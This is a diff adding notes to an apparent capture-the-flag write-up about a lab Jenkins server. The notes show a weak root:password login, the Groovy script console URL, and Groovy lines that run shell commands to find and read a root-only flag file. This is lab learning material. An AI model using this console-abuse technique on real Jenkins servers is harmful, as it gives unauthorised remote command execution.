@@ -5,6 +5,8 @@
 #########
 # TL,DR #
 #########
+A Jenkins server with an insecure login grants access to an area to run Groovy scripts.
+We can send it commands to read the root flag.
 
 ########
 # Hack #
@@ -17,6 +19,17 @@ root:password
 
 Jenkins 2.289.1
 
+There is a scripts directory that takes shell commands:
+http://10.129.146.116:8080/script
+
+println "find / -name flag.txt".execute().text
+Result
+/root/flag.txt
+
+println "cat /root/flag.txt".execute().text
+{flag output}
+
 ###########
 # Learned #
 ###########
+Using Groovy
